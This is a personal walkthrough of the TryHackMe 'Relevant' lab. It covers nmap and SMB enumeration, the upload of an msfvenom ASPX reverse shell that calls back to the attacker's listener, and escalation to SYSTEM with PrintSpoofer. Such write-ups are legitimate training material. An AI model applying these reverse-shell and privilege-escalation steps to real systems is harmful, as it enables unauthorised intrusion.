# Relevant - Penetration Testing Challenge

> Bradley Lubow | rnbochsr, September 2022

*My notes and solutions for the TryHackMe.com's Relevant room.*

## Task 1 - Pre-Engagement Briefing

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope
    Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.

**Writeups will not be accepted for this room.**

### Recon
Starting with the usual workflow of enumeration.

#### NMAP Scan 

```bash
# Nmap 7.80 scan initiated Sun Sep 11 20:04:19 2022 as: nmap -p- -v -sC -sV -T4 -oN scans/nmap.scan 10.10.113.68
Nmap scan report for ip-10-10-113-68.eu-west-1.compute.internal (10.10.113.68)
Host is up (0.00049s latency).
Not shown: 65526 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-09-11T20:06:42+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-09-10T19:58:58
| Not valid after:  2023-03-12T19:58:58
| MD5:   8c1d 1918 13ce e05c 1ed9 5319 c91d e2d7
|_SHA-1: 6b25 309e 164d cfc0 b4ce b4e6 1e4e 1c3e f6ae e374
|_ssl-date: 2022-09-11T20:07:22+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:86:63:56:6E:05 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m49s, median: 0s
| nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:86:63:56:6e:05 (unknown)
| Names:
|   RELEVANT<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  RELEVANT<20>         Flags: <unique><active>
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-11T13:06:42-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-11T20:06:42
|_  start_date: 2022-09-11T19:59:22

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 11 20:07:21 2022 -- 1 IP address (1 host up) scanned in 182.46 seconds
```

There are several things running: 
- Looks like 3 web servers (ports 80, 5985, and 49663)
- An RPC Server 
- A DNS server 
- An Endpoint server
- A Windows Remote Desktop (RDP) server
- An SMB server
- Several other unusual ports probably used for some custom service or API

#### Webservers

**Port 80** 
- Taking a look at the web servers just shows the default web page for a web server. Nothing of interest on the webpage. 

**Port 5985** 
- This server gave a 404 Not Found error. I'll have to do some research to find out what service is running here.

**Port 49663**
- This shows the default web page for the web server. 


#### SMB Scan

While the dirbuster scans enumerated teh webservers, I looked into the SMB port. I'll run an `smbclient -L ////<IP>` scan to see if there are any interesting network shares to poke. 

```bash
root@ip-10-10-122-252:~# smbclient -L ////10.10.53.227
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 	# I left this blank

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.53.227 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Trying some basic user:password combinatons on the shares didn't yield much. The `nt4wrksv` is an anonymous share. 

```bash
root@kali:~# smbclient //target/nt4wrksv/ 
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password:	# I left this blank
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 21:46:04 2020
  ..                                  D        0  Sat Jul 25 21:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020

                7735807 blocks of size 4096. 5135598 blocks available
smb: \>
```

I got access and a file `passwords.txt` that shows up in the directory list. I downloaded the file.
```bash
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (31.9 KiloBytes/sec) (average 31.9 KiloBytes/sec)
```

The file had some `base64` encoded stuff. Running it thru the `base64 -d` command and it was a list of 2 users and passwords!

I tried them hoping they would get me better access, but neither of them worked on anything at this point. Time to return to enumeration. 

#### Dirbuster Scan

I had a very hard time getting the scans to complete. I'm not exactly sure what the issue was, but the target
machine kept crashing on me. In addition, the attack machine had a very hard time scanning. Dirbuster would just hang up trying to generate the wordlists, or just lock up completely. It was very frustrating. 

**Port 80**
* No directories reported.

**Port 49663**
I finally got it to complete the scan it only showed 1 directory. 
- Directory scan of the port shows 1 directory `nt4wrksv`.
- `nt4wrksv` - No other sub-directories

I'm not sure that there aren't other directories, but the VM's were proving a unstable. The target kept repeatedly crashing and the attacking VM also had trouble. It was very frustrating. It continued for several sessions over several days. And when I finally got a scan to complete, I inadvertently didn't save a copy of the scan that showed the directory. And with the trouble I was having, I just noted the directory name and moved on. 

I also ran an `nmap` scan using the `vuln` script to see if I could find any possible vulnerabilities that way. It showed that the `SMB` server was vulnerable to the EternalBlue vulnerability. That would get me administrator access and the flags. 

### Privilege Escalation - EternalBlue

I spent a lot of time over the course of another several days trying to make use of the `eternalblue` vulnerability, but no matter how I tried, I couldn't seem to make it work. After far too long banging into that wall I finally stopped trying and took another look at the `nt4wrksv` sub-directory.

### Web Browsing `nt4wrksv` 

Browsing the `http://<target-IP>:49663/nt4wrksv/` web page and it looks blank. It has the same name as the `SMB` server. I tried to see if it was the same directory by trying to view the `passwords.txt` file. I got the same `base64` encode information. They appear to share the same directory. This makes things interesting. I already know that I can download files from the `SMB` server. If I can also upload files, that would be an easy way to obtain a reverse shell. 

### Gaining a Reverse Shell

* I uploaded a test text file and was able to view the contents in my web browser.
* I configured the `ptm-reverse-shell.php` file with my attacking machine IP and port information. 
* I started a netcat listener.
* I pointed my web browser at the uploaded file and waited for my shell. 
* Nothing happened.

I had to do some additonal research why the `PHP` script didn't work. As it's a Windows machine, it may simply not have a php server active. I used `msfvenom` to create another reverse shell version as an `aspx` file. Using that version I got a call-back from the target machine. 

```bash 
root@ip-10-10-122-233:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.122.233 LPORT=1234 -f aspx > rev-shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3394 bytes
```

In the `smbclient` terminal I uploaded the new reverse shell. Accessed the file in my browser and...

```bash
root@ip-10-10-122-233:~# nc -lvnp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.174.191 49858 received!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Running `whoami` shows that I am operating as the `iis apppool\defaultapppool` user. I can now move about the file system. Navigating to the `Users` directory shows that there are a couple of users: Bob and Administrator.  I can't access the administrator's `home` directory, but I can access Bob's. Navigating to Bob's `Desktop` directory and I find the user flag file. 

```bash 
c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,057,409,024 bytes free

c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fd[REDACTED]45}
c:\Users\Bob\Desktop>

```

### Enumeration from inside

#### winPEAS 

I uploaded a copy of `winPEAS` and scanned the machine for additonal vulnerabilities. The output gives a lot of information and lists 9 potential vulnerabilities. 

```bash
  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Wa
tson)
    OS Build Number: 14393
       [!] CVE-2019-0836 : VULNERABLE
        [>] https://exploit-db.com/exploits/46718
        [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadw
rite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-sy
stem/                     

       [!] CVE-2019-0841 : VULNERABLE
        [>] https://github.com/rogue-kdc/CVE-2019-0841
        [>] https://rastamouse.me/tags/cve-2019-0841/

       [!] CVE-2019-1064 : VULNERABLE
        [>] https://www.rythmstick.net/posts/cve-2019-1064/

       [!] CVE-2019-1130 : VULNERABLE
        [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

       [!] CVE-2019-1253 : VULNERABLE
        [>] https://github.com/padovah4ck/CVE-2019-1253

       [!] CVE-2019-1315 : VULNERABLE
        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary
-file-move-eop.html                                                           
                          
       [!] CVE-2019-1385 : VULNERABLE
        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

       [!] CVE-2019-1388 : VULNERABLE
        [>] https://github.com/jas502n/CVE-2019-1388

       [!] CVE-2019-1405 : VULNERABLE
        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                             

    Finished. Found 9 potential vulnerabilities.
```

#### iis User Privileges

Looking at the current `iis` user's privileges shows:

```bash 
c:\inetpub\wwwroot\nt4wrksv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
`SeImpersonatePrivilege` is enabled, and I've heard about a couple of vulnerabilities relating to that. So time to start running thru the list of possibilities. 

### Privilege Escalation

I had trouble with much of the data from `winPEAS`, so I focused on the `SeImpersonatePrivilege` vector. I did a little more researching. It seems that the target might be vulnerable to `PrintSpoofer` I got a copy from GitHub.com. I used the `SMB` server to upload the `PrintSpoofer.exe` file to the target machine. Then I navigated the reverse shell terminal to the web server location.

```bash 
c:\>cd inetpub\wwwroot\nt4wrksv\
cd inetpub\wwwroot\nt4wrksv\
c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

10/15/2022  10:00 PM    <DIR>          .
10/15/2022  10:00 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
10/15/2022  10:00 PM            27,136 PrintSpoofer.exe
10/15/2022  09:54 PM             3,415 shell-x64.aspx
10/15/2022  09:46 PM             2,759 shell-x86.aspx
               4 File(s)         33,408 bytes
               2 Dir(s)  21,057,540,096 bytes free

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\Users\Administrator
cd c:\Users\Administrator

c:\Users\Administrator>cd Desktop
cd Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,057,540,096 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1f[REDACTED]pv}
c:\Users\Administrator\Desktop>
```

`PrintSpoofer.exe` worked the first time right out of the box. I hate being a script kiddie, but it is great when the exploits just work. 


## Final Thoughts

This was a fun challenge. I ran into a lot of walls trying to make things that I thought should work, work. As it turns out, most of the rabbit holes I went into were built on purpose. As I understand it, the idea was that we do have to try harder, but we also have to try other things when one method just won't seem to work. I took far too long to get that. I spent a lot of time trying to make EternalBlue work. Several other items from my `nmap.vulns` scan gave me a good deal of false hope. But it was fun. And I will certainly remember that while trying harder is good, trying mutliple potential vulnerability vectors is also often required. 
